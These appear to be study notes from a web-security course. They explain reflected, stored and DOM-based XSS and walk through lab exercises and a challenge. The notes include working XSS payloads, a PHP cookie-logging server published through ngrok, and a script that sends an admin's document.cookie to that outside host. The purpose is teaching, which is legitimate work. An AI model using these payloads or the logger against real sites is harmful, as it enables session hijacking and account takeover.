## Overview

**What is XSS**
- XSS stands for Cross-site Scripting
- It allows us to execute JavaScript in a victim's browser
- We have 3 types of XSS which are
    - **Reflected** 
	    - - is where the script we are trying to inject comes from the current http request, it is somehow limited cos' it looks like we are only targeting ourselves
    - **Stored** 
	    - This one is much more powerful because our payload is stored in something like a database and then can be retrieved later
    - **DOM** 
	    - **enables attackers to inject a malicious payload into a web page by manipulating the client's browser environment**. Since these attacks rely on the Document Object Model, they are orchestrated on the client-side after loading the page.

## XSS - DOM Lab

**Exploring a DOM-based XSS Vulnerability**

In this lab, you get a web page where we can add items to a list. 
No actual requests are made to external resources.

1. **Inspection Reveals Static Content**: Inspecting the network tab, no requests made outside of local resources.
2. **Payload Testing**: inject a simple payload `<script>prompt(1)</script>`, stored as an item and not executed.
3. **Discovering the Trigger**: After experimenting we see quote escaping: `"><img src=/ onerror="prompt(1)">` triggers the XSS vulnerability.

## XSS - Stored Lab

1. **HTML Injection Test**: Begin by testing for HTML injection to see if it's executed.
    ```
    <h1>this is a test</h1>
    ```
    - The injected HTML is executed

2. **Testing for XSS**: Next, we try to trigger XSS using the payload `<script>alert(1)</script>`, which works

3. **Cookie Theft**: We can also try to steal cookies using the payload `<script>alert(document.cookie)</script>`.

## XSS - Challenge Walkthrough

### Flow

1. **Sending the Payload**: send a basic XSS payload via the support ticket page to the admin
2. **Confirming XSS**: navigate to the admin page  > refresh
	- XSS executed
### Preparing 
1. **Setting up Ngrok Server**: create a PHP script to log admin activities and start a server.

    ```PHP
    <?php
    $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    $ua=$_SERVER['HTTP_USER_AGENT'];

    $fp=fopen('cookies.txt' , 'a+');
    fwrite($fp, $ip.' '.$ua."\n");
    fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
    fclose($fp);
    ?>
    ```

    - publish through ngrok
    ```bash
    $ ngrok http 80
    ```

2. **Crafting XSS Payload**: make an XSS payload to steal the admin cookie and send it to the remote server.
    ```js
    <script> var i=new Image(); i.src="<NGROK>/xss.php?cookie="+document.cookie;</script>
    ```
3. go to ngrok link `/<filename>.php`
	- /cookies.txt

### Launching

1. **Submitting the Payload**: We submit the XSS payload to the admin.
    ```js
    <script> var i=new Image(); i.src="<NGROK>/xss.php?admin_cookie="+document.cookie;</script>
    ```
2. **Obtaining the Admin Cookie**: Upon refreshing the admin page, we see our server logs the admin cookie.

